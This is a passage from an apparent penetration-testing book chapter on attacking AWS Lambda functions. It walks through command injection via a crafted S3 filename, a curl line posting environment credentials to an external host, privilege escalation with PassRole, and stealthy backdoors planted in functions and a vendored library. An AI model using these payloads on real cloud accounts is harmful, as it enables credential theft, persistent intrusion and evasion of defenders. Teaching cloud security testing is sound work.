["```\nimport boto3\nimport subprocess\nimport urllib\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n\n    for record in event['Records']:\n        try:\n            bucket_name = record['s3']['bucket']['name']\n            object_key = record['s3']['object']['key']\n            object_key = urllib.parse.unquote_plus(object_key)\n\n            if object_key[-4:] != '.zip':\n                print('Not a zip file, not tagging')\n                continue\n\n            response = s3.get_object(\n                Bucket=bucket_name,\n                Key=object_key\n            )\n\n            file_download_path = f'/tmp/{object_key.split(\"/\")[-1]}'\n            with open(file_download_path, 'wb+') as file:\n                file.write(response['Body'].read())\n\n            file_count = subprocess.check_output(\n                f'zipinfo {file_download_path} | grep ^- | wc -l',\n                shell=True,\n                stderr=subprocess.STDOUT\n            ).decode().rstrip()\n            s3.put_object_tagging(\n                Bucket=bucket_name,\n                Key=object_key,\n                Tagging={\n                    'TagSet': [\n                        {\n                            'Key': 'NumOfFilesInZip',\n                            'Value': file_count\n                        }\n                    ]\n                }\n            )\n        except Exception as e:\n            print(f'Error on object {object_key} in bucket {bucket_name}: {e}')\n    return\n```", "```\n{\n    \"Version\": \"2012-10-17\",\n     \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"lambda:List*\",\n                \"lambda:Get*\",\n                \"s3:PutObject\"\n            ],\n            \"Resource\": \"*\"\n        }\n    ]\n}\n```", "```\naws lambda list-functions --profile LambdaReadOnlyTester --region us-west-2\n```", "```\n\"Environment\": {\n    \"Variables\": {\n        \"app_secret\": \"1234567890\"\n    }\n}\n```", "```\naws lambda get-function --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2\n```", "```\nvirtualenv bandit-env\npip3 install bandit\n```", "```\nbandit -r ./VulnerableFunction/\n```", "```\nfile_download_path = f'/tmp/{object_key.split(\"/\")[-1]}'\n```", "```\naws lambda list-event-source-mappings --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2\n```", "```\n{\n    \u201cEventSourceMappings\u201d: []\n}\n```", "```\naws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester --region us-west-2\n```", "```\n{\n    \"Policy\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Id\\\":\\\"default\\\",\\\"Statement\\\":[{\\\"Sid\\\":\\\"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"Service\\\":\\\"s3.amazonaws.com\\\"},\\\"Action\\\":\\\"lambda:InvokeFunction\\\",\\\"Resource\\\":\\\"arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction\\\",\\\"Condition\\\":{\\\"StringEquals\\\":{\\\"AWS:SourceAccount\\\":\\\"000000000000\\\"},\\\"ArnLike\\\":{\\\"AWS:SourceArn\\\":\\\"arn:aws:s3:::bucket-for-lambda-pentesting\\\"}}}]}\",\n    \"RevisionId\": \"d1e76306-4r3a-411c-b8cz-6x4731qa7f00\"\n}\n```", "```\n{\n    \"Version\": \"2012-10-17\",\n    \"Id\": \"default\",\n    \"Statement\": [\n        {\n            \"Sid\": \"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Service\": \"s3.amazonaws.com\"\n            },\n            \"Action\": \"lambda:InvokeFunction\",\n            \"Resource\": \"arn:aws:lambda:us-west-2:000000000000:function:VulnerableFunction\",\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"AWS:SourceAccount\": \"000000000000\"\n                },\n                \"ArnLike\": {\n                    \"AWS:SourceArn\": \"arn:aws:s3:::bucket-for-lambda-pentesting\"\n                }\n            }\n        }\n    ]\n}\n```", "```\nLine 13: object_key is assigned the value of \"hello.zip\"\n\nLine 14: object_key is URL decoded by urllib.parse.unquote_plus (Note: the reason this line is in the code is because the file name comes in with special characters URL encoded, so those need to be decoded to work with the S3 object directly)\n\nLine 25: file_download_path is assigned the value of f'/tmp/{object_key.split(\"/\")[-1]}', which ultimately resolves to \"/tmp/hello.zip\"\n\nLines 29-30: A shell command is run with the input f'zipinfo {file_download_path} | grep ^- | wc -l', which resolves to \"zipinfo /tmp/hello.zip | grep ^- | wc -l\".\n```", "```\nnc -nlvp 80\n```", "```\ncurl -X POST -d \"`env`\" 1.1.1.1\n```", "```) instruct bash to run the `\"env\"`\u00a0command prior to executing the whole `curl` command, so it will then `POST` those variables to our external server. Also, because our server is listening on port `80`, we don't need to include `http://` or the port in our `curl` command, because given an IP address, the default is to go to `http://1.1.1.1:80`. We can avoid a lot of unnecessary characters this way. This may not necessarily be a conventional way of doing this, but what is nice about this string is that it is easy to fit into a filename, which is exactly what we need to exploit this Lambda function!\n\nBack to our payload; now, we will need to upload a file to S3 with the following name:\n\n```", "```\n\nMicrosoft Windows won't let you create a file with this name because of the double quotes in it, but it is easy to do so with Linux. We can use the `touch`\u00a0command to create the file. It will look like this:\n\n```", "```\n\nThe output of the preceding command will look something like this:\n\n![](img/215c8c00-1f95-48dd-b752-e4274bc82d14.png)\n\nCreating our file with the malicious name on our own Ubuntu server\n\nEverything is in place now. All we need to do is ensure that our NetCat listener has started on our external server, and then we need to upload this file to the `bucket-for-lambda-pentesting` S3 bucket, then wait for the Lambda function to be invoked, and then, finally, wait for our malicious command to execute. We can upload it by using the S3 `copy` AWS CLI command to copy our local malicious file to the remote S3 bucket:\n\n```", "```\n\nIt looks a little messed up because of our malicious filename, but all it is doing is using the S3 `copy` command as the `LambdaReadOnlyTester` AWS CLI profile to copy our local malicious file to the `bucket-for-lambda-pentesting`\u00a0S3 bucket. After executing this command, we just wait and watch our NetCat listener, in hope of some credentials! A few seconds later, we'll see the following:\n\n![](img/972de3e2-9dfb-48ed-8a9d-75616e094317.png)\n\nAll the environment variables from the Lambda server posted to our NetCat listener\n\nWe did it! We just successfully achieved code execution on the server running a Lambda function, through a method sometimes referred to as event injection, and then we successfully exfiltrated the credentials of the role attached to that Lambda function to our external server. Now, you can throw those credentials into your AWS CLI and go forth and conquer!\n\nBonus: At the time of writing, GuardDuty's `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`\u00a0finding type ([https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11)) does not apply to credentials exfiltrated from Lambda servers!\n\nOne final note is to say that we exploited one method of event injection to exploit this Lambda function, but there are plenty of other kinds. You can trigger Lambda function invocations through a variety of methods, such as the DynamoDB example from earlier, or possibly from a CloudWatch Events rule. You just need to find out how you can get your own input into the function to take control of the execution. The simplest, quickest way to make this happen is to use a custom test event (if you have the `\"lambda:InvokeFunction\"` permission), because you can just specify the exact payload that you need in the event.\n\nOther things to keep in mind while pentesting Lambda functions (with read access) include the following:\n\n*   Check the tags associated with each function for sensitive information. This is highly unlikely, but not unheard of.\n*   As we discussed earlier, consider copying the whole function over to your own AWS account for testing, so that you don't need to make noise in the target environment.\n*   If you have CloudWatch logs access, review the execution logs for each Lambda function to see if anything sensitive was printed (stored in the `\"/aws/lambda/<function name>\"` log group).\n*   You can download a `.zip` file of the entire Lambda function from the AWS web console by clicking on the `\"Actions\"` drop-down menu, clicking on\u00a0`\"Export function\"`, and choosing `\"Download deployment package\"`. Then, it is simple to port over to your own account.\n*   Try to formulate your payloads so that they do what you want without breaking the execution of the function. A Lambda function execution that errors out might attract some unwanted attention!\n*   When writing your payloads, be wary of the timeout of the function. The default is for the function to timeout after three seconds, so you will need some quick, easy exfiltration in that case.\n\n# Attacking Lambda functions with read and write access\n\nNow that we have covered attacking Lambda functions while you only have read access to Lambda, we will move on to read and write access. In this scenario, we are going to assume that you, as the attacker, have `\"lambda:*\"` permissions, which basically means that you can read and write anything, which includes editing existing functions, creating your own functions, deleting functions, and so on. This opens a whole new attack surface that is prime for many different attacks, particularly privilege escalation, data exfiltration, and persistence.\n\nFor this section, we won't be setting up a new vulnerable function, but instead we will just use what we set up previously for a few demos.\n\n# Privilege escalation\n\nPrivilege escalation through Lambda functions is relatively easy, depending on the setup that you encounter. We'll look at two separate scenarios: one where you have `\"lambda:*\"` permissions and `\"iam:PassRole\"` permissions, and one with just `\"lambda:*\"` permissions.\n\nFirst, we are going to assume that we have the `\"iam:PassRole\"` permission in addition to our full Lambda access. We'll also assume that we can list IAM roles, but nothing more than that (`iam:ListRoles`). In this scenario, our target doesn't necessarily even need to be actively using Lambda for us to escalate our privileges. Because we have the IAM `ListRoles` permission, we can run the following AWS CLI command to see what IAM roles exist in the account (make sure to specify the correct profile that you are working with):\n\n```", "```\n\nYou should get back a list of each role in the account and their `\"AssumeRolePolicyDocument\"`. Now, we can filter through this list to find any role that Lambda can assume. Here is what an example role would look like in this response (this is the role that we created for our vulnerable function):\n\n```", "```\n\nWe can see that under `\"AssumeRolePolicyDocument\"`|`\"Statement\"` |`\"Principal\"`, a `\"Service\"` is specified, and its value is `\"lambda.amazonaws.com\"`. This means that the Lambda AWS service can assume this role and get temporary credentials. For a role to be attached to a Lambda function, Lambda must be able to assume it.\n\nNow, filter out the role list so that you only have roles that can be assumed by Lambda left. Again, we are assuming that we don't have any more IAM privileges aside from\u00a0`ListRoles` and `PassRole`, so we can't investigate what permissions these roles have, and our best bet is to try to infer what services they are meant to work with, based on their names and descriptions. One of the roles that showed up when running IAM `ListRoles` was named `\"LambdaEC2FullAccess\"`, which makes it obvious what permissions we can expect it to have. EC2 is one of the more fruitful services to gain access to, so we are going to target this role for our demo.\n\nIn previous chapters, we looked at the IAM `PassRole` permission, which allows us to `\"pass\"` an IAM role to some AWS resource, to give it access to the temporary credentials for that role. One example of this is passing a role to an EC2 instance, which allows the EC2 service to access the role; we even passed a role to our vulnerable Lambda function earlier in this chapter. We have full access to Lambda and the ability to pass roles to Lambda functions, so that means we can essentially gain access to any role that Lambda can access.\n\nThis can be done through the AWS CLI with the Lambda `CreateFunction` API, but we are going to walk through the AWS web console. First, we will want to create a new Lambda function, give it a name (`\"Test\"` for this demo), choose a runtime (`python3.7` again), and select `\"Choose an existing role\"` for the Role drop-down menu. Then, we are going to select `\"LambdaEC2FullAccess\"` from the Existing role drop-down menu, and finally, we click on\u00a0`\"Create function\"`.\n\nThis time, we have direct access to the code of the function, so we won't need to exfiltrate, or even look at, the credentials for this role. We can just use the AWS SDK library for the programming language we chose, which is the Python `boto3` library; it is included in the Lambda setup, so there is no need to include it as a dependency for the function. Now, all that is left is deciding what we want to do with the role we are gaining access to, and we know it has `\"EC2FullAccess\"` permissions based on the name, so we will import `boto3`, create an EC2 client, and call the EC2 `DescribeInstances` API. This only takes a few lines of code in Python, but we will want to format the JSON responses that are returned for easier reading, so we will also use the JSON library. This can be seen here:\n\n```", "```\n\nSomething to note is that we don't need to specify the credentials for the `boto3` client, because it will automatically check environment variables if we don't explicitly pass anything in. This way, it will always use the most up-to-date credentials in the Lambda function.\n\nTo execute the function, we need to create a test event, so make sure that you click on the orange Save button, and then click on the white Test button directly to the left of it:\n\n![](img/8791b537-b937-4c1d-bd9d-94989dd775fe.png)\n\nThe Test button to create our test event\n\nIt should pop up a screen to set up a test event; we don't care how it is configured, because we are not actually using the event. It is just required to run the function through the web console. We'll select the `Hello World`\u00a0event template (you can choose anything) and give it the name `Test`, and then click on\u00a0Create on the bottom right of the screen:\n\n![](img/f729d0b7-8abc-4ee0-9c7e-091c8dd3890f.png)\n\nCreating a simple test event for our function\n\nNow we can just click on the Test button one more time, and it will execute our function using the test event that we just created. We found a single EC2 instance in the `us-west-2` region (the `AWS_REGION` environment variable is automatically set to the region our Lambda function is in, so `boto3` will use that for the API call). We can see these results in the Execution Results tab, which should pop up after the function executes:\n\n![](img/3a4a3d86-4795-4cc7-b300-20ece08b8c2e.png)\n\nA small section of information retrieved about the EC2 instances in us-west-2\n\nThat worked, so it's clear that we can write whatever code we want and instruct the IAM role to do what we want. Maybe we want to start up a bunch of EC2 instances, or we want to try to use this EC2 access for further exploitation, or many other possibilities. If you didn't have the IAM `ListRoles` permission, you could look at other existing Lambda functions to see what roles are attached to them, and then you could try those out to see what kind of access you gained.\n\nFor our second scenario, we are assuming that we do not have the IAM `PassRole` permission, which means that we can't create a new Lambda function, because the function is required to have a role passed to it. To capitalize on this situation, we need to work with existing Lambda functions. For this demo, we'll be targeting the `VulnerableFunction` we created earlier in this chapter.\n\nWe need to be a little bit more careful in this situation, because instead of creating new Lambda functions, we will be modifying existing functions. We don't want to disrupt anything going on in the environment, because first, we try to avoid that at all costs as pentesters, and secondly, we don't want to attract more attention to ourselves as an attacker than is needed. A Lambda function that suddenly stops working would be a big red flag to someone paying attention. We can make sure this doesn't happen by ensuring that any code we add to the function doesn't disrupt the rest of the execution, which means we need to catch and silence any error that our additional code throws. Also, because we might not know if a function is going to error out early in its normal execution, we should try to put our code as close to the beginning of the execution as we can, in order to ensure it gets executed.\n\nBack to the `VulnerableFunction` we created earlier, we know that the role attached to it has S3 permissions, because the function code interacts with S3 (and because we set the role up ourselves). To start somewhere simple, we are just going to list the S3 buckets in the account to see what we can work with. We can do this by adding the following code to the\u00a0`VulnerableFunction`, right after line 6 (as soon as\u00a0`lambda_handler()` is invoked, and prior to any other code running):\n\n```", "```\n\nWe could even go as far as we did previously, to import the JSON library and format the output, but it's best to make as few changes as possible to the existing function. We are using a `try`/`except` block to make sure that any errors that arise don't halt the execution of the function, and by putting `pass` in the except block, we can ensure that the error is silently discarded, and the function will then execute as normal. The beginning of that\u00a0`VulnerableFunction` should now look like this:\n\n![](img/e1d7eeef-e7aa-4212-9503-42aefa375920.png)\n\nThe beginning of VulnerableFunction after we added our code to it\n\nThe only problem with this payload is that it assumes we can view the execution logs of this Lambda function, which we may or may not have access to. We need either access to CloudWatch logs or the ability to run the function with test events, so we can view the output in the web console. For now we'll say that we don't have CloudWatch access, so we'll have to go with test events. The next problem is that we\u00a0are\u00a0likely missing the whole context around this Lambda function. We don't necessarily know when it would make sense for the function to be invoked, when it would make sense that the function errors out, how often it gets invoked, what the implications are if it is invoked outside of its normal triggers, and many other things.\n\nTo solve that problem, we can either just ignore it and run test events against the function without worrying about the consequences (not a good idea, unless you are very sure it won't break anything in the environment and that it won't attract unnecessary attention from a defender), or we can modify our payload to exfiltrate the credentials, kind of like the first section of this chapter. This would likely be the safest method, because we can add our malicious payload to the function, set up a listener on our external server, and then just wait until the Lambda function gets invoked normally. To do this, we could import the\u00a0subprocess and use `curl`\u00a0like before, but a simpler way would be to use the Python `requests` library. Requests isn't automatically included in the default libraries available to a Lambda function, but `botocore` is, and `botocore` relies on the `requests` library, so there is a cool trick that we can use to import and use `requests`. Instead of `import requests`, we use the following `import` statement:\n\n```", "```\n\nNow, we can access the `requests` library normally. So, following a similar method to what we did earlier in this chapter, we can just send an HTTP `POST` request with all the environment variables to our external server. We could also run the AWS API calls from within the Lambda function and exfiltrate the output, which would technically be safer, because the API calls would be coming from the same IP address as expected, rather than our external attack IP; however pulling the environment variables is more versatile and requires less modification to the function over time, so we are going with that. The following payload will do just that (where we are pretending that\u00a0`1.1.1.1` is the IP of our external server again):\n\n```", "```\n\nIt uses the `requests` library to send an HTTP `POST` request that contains the environment variables fetched with the OS library, and the timeout is set to `0.01` so that the request is sent; the code immediately moves on, rather than waiting for any response and causing the Lambda function itself to timeout. Once this payload is added to the target Lambda function, we just wait for the function to get invoked by normal means, and eventually, we will get the credentials sent to our server:\n\n![](img/286eb121-c4d3-46c6-ba28-336429a9dc39.png)\n\nReceiving a POST request containing all the environment variables of the Lambda function\n\n# Data exfiltration\n\nData exfiltration will likely work very similarly to how we escalated our privileges previously, in that we will most likely edit an existing function and exfiltrate data from it like that. There are a lot of different ways we could do this, some of which are listed here:\n\n*   Modify an existing function and exfiltrate the data that it is receiving through the `\"event\"` and `\"context\"` parameters\n*   Create a new function and associated trigger to respond to certain events in the AWS environment, such as in [Chapter 11](0d6c1dfb-b078-4ed0-a92a-b86751ef1db8.xhtml),*\u00a0Using Boto3 and Pacu to Maintain AWS Persistence* where we exfiltrated credentials every time a new user was created\n*   Modify an existing function and place our exfiltration payload somewhere in the middle of the function to exfiltrate data that is gathered/modified during the function's normal execution\n\nThere are many other attack vectors here, as well; you just need to get creative.\n\nIf we just wanted our payload to exfiltrate the value passed to the `\"event\"` parameter, we could use a slightly modified version of the previous payload:\n\n```", "```\n\nMake sure to be aware of the timeout specified for the Lambda function you are working with. You don't want your exfiltration to take so long that the Lambda function times out and fails all together, so when you are exfiltrating large amounts of data through Lambda, it would be best to either ensure the timeout is already set to a high amount of time, or to go in and modify it yourself to increase the timeout. The problem with that is that the target's Lambda bill will go up, because their functions are taking longer to complete than normal, which would draw attention to you.\n\n# Persistence\n\nWe aren't going to dive too deeply into persistence because we covered that in the last chapter, but, as with the other methods of attacking Lambda, persistence can be established with new Lambda functions or by editing existing Lambda functions. Persistence can also mean a few different things. Do you want persistence access to a bash shell for a Lambda function, do you want persistent access to the AWS environment, or do you want both? It is all about context and what works best for the situation you are in as an attacker. It might even be valuable to backdoor multiple Lambda functions, in case one gets caught and removed by a defender.\n\n# Staying stealthy\n\nThis is where you can get creative. Obviously, random code added to a function that sends data to a random IP address will look fishy to anyone who is familiar with the code and is taking another look at it. In that situation, there might not even be an indicators-of-compromise that a defender picked up on, but a developer happened to notice this weird code in the Lambda function and asked a question about it, which then get you caught. It would be even more obvious with the malicious code at the beginning of the entire function like we would want it, so nesting your payload somewhere in the code would help a little bit.\n\nWhat about placing your payload somewhere that wouldn't change anything in the entry function (`lambda_handler()`) and would have an extremely low chance of ever being manually reviewed/discovered? It sounds too good to be true, but it's not! Malicious hackers have been using similar techniques for many years, allowing their software/hardware backdoors to remain active for very long periods of time, so let's just adapt that technique to Lambda and stay under the radar!\n\nThis technique involves backdooring dependencies that a Lambda function relies on. Not every library you'll ever need is included in Lambda's base set of libraries, as we saw when we were being unable to `import requests`\u00a0directly, so developers are forced to gather these dependencies themselves and upload them to Lambda with the rest of their code. We'll take a short look at a simple example of this.\n\nLet's suppose that we were not able to import the `requests` library with `from botocore.vendored import requests`, and we needed to include that library with our Lambda code. This could be solved by including the `requests` library alongside our base Lambda code and uploading it as a `.zip` file to Lambda.\n\nFor this example, we have a `lambda_function.py` file that imports `requests` and makes a request to [https://google.com/](https://google.com/), and then prints the response text. The `requests` library is included in its entirety alongside it, to allow for the `import requests` code on line 2 in the following screenshot. The `requests` library requires the `chardet`, `urllib3`, `idna`, and `certify` libraries, as well, so those have been included:\n\n![](img/0ed9d39c-4529-40a5-b318-752f416e69eb.png)\n\nAn example Lambda function that uses an included requests library\n\nThis function is short, so it would be obvious to just about anyone if the code was modified directly during our attack, but because it is importing the `requests` library, and the `requests` library source code is right there, as well, that will be our target. We can see that on line 4, the `requests.get()` method is being invoked. If we go looking around the source code of the `requests` library, we can find the `requests.get()` method in the `api.py` file, on line 63 (at the time of writing this, at least):\n\n![](img/292e3758-55b4-461a-b11a-ba9f58338ab2.png)\n\nThe source code for the requests.get() method\n\nWe already know that this method is invoked every time the Lambda function will run, so all we need to do is modify it directly, rather than modifying the file that invokes it (`lambda_function.py`). Our payload needs to be a little different this time, because the entire `requests` library is not directly imported into each file within the `requests` library, so we have to use the `\"request\"` method, rather than `requests.post()`. Our payload will look like the following:\n\n```", "```\n\nThis payload will basically just exfiltrate all the details about each request being made to our own server prior to completing the original request. We might be able to intercept some sensitive data to use to our advantage. We can place our malicious exfiltration payload right in the `get` method, as shown in the following screenshot:\n\n![](img/30132e26-f6ca-417a-99b1-593714e5a6e2.png)\n\nOur payload placed in the requests.get() method\n\nEven if it does look a little strange, very few developers would ever think to review the source code of one of the libraries they've included, and even if they did, they didn't write the library, so it might not necessarily even stand out as strange to them. Now, every time this Lambda function is invoked, the `requests.get()` method will be invoked, which means that our payload will get executed and we will exfiltrate some data:\n\n![](img/bb406a51-c093-499e-86a9-96ad2b3c23ec.png)\n\nSuccessful exfiltration from within a Python dependency\n\nWe have now successfully exfiltrated information from a Lambda function without modifying any of the actual code of the main function. This attack can go many levels deeper, as well. If the main Lambda function requires library X, and the method in library X requires library Y, you could then backdoor all the way down into library Y. There are no limits, just as long as your method gets invoked somehow.\n\nTo do this in a real attack scenario, all you would need to do is export the Lambda function to a `.zip` file like we did earlier, make your modifications, and then re-upload it as the latest version for that function. Even if a defender sees that the function was modified, they still may never find the backdoor you implemented.\n\n# Pivoting into Virtual Private Clouds\n\nWe've covered a lot of material involving attacking Lambda functions, but in this section, we will discuss pivoting from access to a Lambda function to access to the internal network of a **virtual private cloud** (**VPC**). This is made possible because Lambda functions can be launched into VPCs for a variety of reasons. This provides us attackers with Lambda access with the ability to interact with internal hosts and services that we may not otherwise be able to gain access to.\n\nAgain, we can approach this from two different angles. If we have the required privileges, we can launch a new Lambda function into a VPC of our choice, or we can modify the code of a Lambda function that has already been launched into a VPC. We're going to run through a demo wherein we will be editing a function that has\u00a0already been launched into a VPC.\n\nFor this demo, if we look at the Network tab in the Lambda web UI, we can see that this function has been launched into the default VPC, it is in two subnets, and it is in the security group `sg-0e9c3b71`. We can also see that the security group allows inbound access to port 80 from some IP address, and it allows access to all ports from servers within the same security group:\n\n![](img/379e712a-23b8-492e-9ac0-c9e9b00a778e.png)\n\nThe network settings for our target Lambda function\n\nWe will\u00a0then run an EC2 `DescribeInstances` API call to find out what other servers exist in this VPC. We can do this with the following AWS CLI command:\n\n```", "```\n\nOr, we can use the `\"ec2__enum\"` Pacu module. The results show us that there is one EC2 instance, and it is in the same security group as our Lambda function:\n\n![](img/20938411-2a70-46c9-9939-9925406bc8eb.png)\n\nOne EC2 instance in the same security group as our Lambda function\n\nBased on what we saw in this security group's inbound rules, we know that our Lambda function has access to every port on that EC2 instance. We also know that something is likely being hosted on port `80`, because the same security group whitelists access to port `80` to a different IP address. As an attacker with a small amount of EC2 permissions, it would generally be difficult to gain access to the inside of a VPC, but Lambda lets us get around that. We just need to modify the code in the Lambda function to do what we want within the VPC's network.\n\nWe're going to ignore whatever code is in our target Lambda function and just focus on our payloads to access the internal network. We know that we want to contact port `80` on that internal host, which likely means there is an HTTP server running, so we can use the `requests` library again to make a request to it. We still don't want to disrupt any production code, so everything will be wrapped in a `try`/`except` block, like before. The EC2 `DescribeInstances` call from a minute ago gave us the internal IP address of the target EC2 instance, which is `172.31.32.192`. Our payload will look something like this:\n\n```"]